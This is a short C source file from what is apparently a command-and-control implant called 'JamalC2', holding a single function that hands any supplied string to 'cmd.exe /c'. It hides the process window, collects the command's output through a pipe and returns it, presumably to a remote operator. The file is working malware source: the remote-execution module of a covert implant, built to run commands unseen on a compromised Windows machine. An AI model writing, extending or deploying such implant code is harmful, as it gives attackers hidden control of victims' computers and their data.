/*
 * JamalC2 Implant - Shell Command Execution
 */

#include "shell.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>


char *shell_execute(const char *command) {
  HANDLE hReadPipe, hWritePipe;
  SECURITY_ATTRIBUTES sa;
  STARTUPINFOA si;
  PROCESS_INFORMATION pi;

  char *output = NULL;
  size_t output_size = 0;
  size_t output_used = 0;

  // Set up security attributes
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  // Create pipe for stdout
  if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
    return safe_strdup("Failed to create pipe");
  }

  // Ensure read handle is not inherited
  SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

  // Set up startup info
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.hStdOutput = hWritePipe;
  si.hStdError = hWritePipe;
  si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  ZeroMemory(&pi, sizeof(pi));

  // Build command line
  char cmdline[1024];
  snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", command);

  // Create process
  if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                      NULL, &si, &pi)) {
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    return safe_strdup("Failed to execute command");
  }

  // Close write end of pipe
  CloseHandle(hWritePipe);

  // Read output
  output_size = 4096;
  output = safe_malloc(output_size);

  char buffer[1024];
  DWORD bytes_read;

  while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytes_read, NULL) &&
         bytes_read > 0) {
    // Grow buffer if needed
    while (output_used + bytes_read + 1 > output_size) {
      output_size *= 2;
      output = safe_realloc(output, output_size);
    }

    memcpy(output + output_used, buffer, bytes_read);
    output_used += bytes_read;
  }

  output[output_used] = '\0';

  // Wait for process to finish
  WaitForSingleObject(pi.hProcess, 5000);

  // Cleanup
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  CloseHandle(hReadPipe);

  return output;
}
